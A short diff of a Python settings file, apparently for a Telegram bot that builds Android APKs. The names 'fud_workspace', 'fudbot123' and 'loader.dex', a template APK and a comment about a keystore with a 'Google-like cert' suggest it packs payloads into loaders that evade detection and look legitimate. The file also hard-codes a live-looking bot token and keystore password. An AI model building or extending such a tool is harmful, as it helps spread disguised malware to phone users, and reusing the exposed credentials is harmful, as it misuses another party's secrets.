@@ -3,6 +3,7 @@ import os
 BOT_TOKEN = "8902950524:AAFxUFbICKx4sm5JM-WGudYOSfjR3w59_Dk"
 
 _HOME = os.path.expanduser("~")
+_HERE = os.path.dirname(os.path.abspath(__file__))
 TOOLS_DIR = os.path.join(_HOME, "tools")
 
 JAVA_BIN      = os.path.join(TOOLS_DIR, "jre", "bin", "java")
@@ -14,13 +15,14 @@ ZIPALIGN_BIN  = os.path.join(BT_DIR, "zipalign")
 D8_BIN        = os.path.join(BT_DIR, "d8")
 ANDROID_JAR   = os.path.join(TOOLS_DIR, "platforms", "android-34", "android.jar")
 
-# NEW filename → forces fresh keystore with Google-like cert
 KEYSTORE_PATH = os.path.join(TOOLS_DIR, "release_play.p12")
 KEYSTORE_PASS = "fudbot123"
 KEY_ALIAS     = "androidkey"
 
-WORK_DIR     = os.path.join(_HOME, "fud_workspace")
-TEMPLATE_APK = os.path.join(WORK_DIR, "template.apk")
+WORK_DIR = os.path.join(_HOME, "fud_workspace")
+
+# Template APK = GitHub repo root me main.py ke saath rakho
+TEMPLATE_APK = os.path.join(_HERE, "template.apk")
 
 LOADER_SRC_DIR = os.path.join(TOOLS_DIR, "loader_src")
 LOADER_DEX     = os.path.join(TOOLS_DIR, "loader.dex")
